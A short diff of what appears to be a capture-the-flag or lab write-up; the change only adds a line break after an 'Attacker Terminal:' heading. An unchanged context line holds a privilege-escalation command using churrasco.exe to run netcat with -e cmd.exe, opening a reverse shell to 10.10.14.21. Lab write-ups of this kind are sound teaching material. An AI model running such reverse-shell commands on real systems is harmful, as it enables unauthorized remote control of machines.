@@ -58,7 +58,7 @@ Command: churrasco.exe -d "C:\wmpub\nc.exe 10.10.14.21 778 -e cmd.exe"
 
 ![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e125371c-0b6c-47d5-a7b9-aaaa0b89b20e)
 
-Attacker Terminal:
+Attacker Terminal:<br>
 ![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/24a046de-62a9-4243-8d0a-30242d7d33b9)
 
 11.
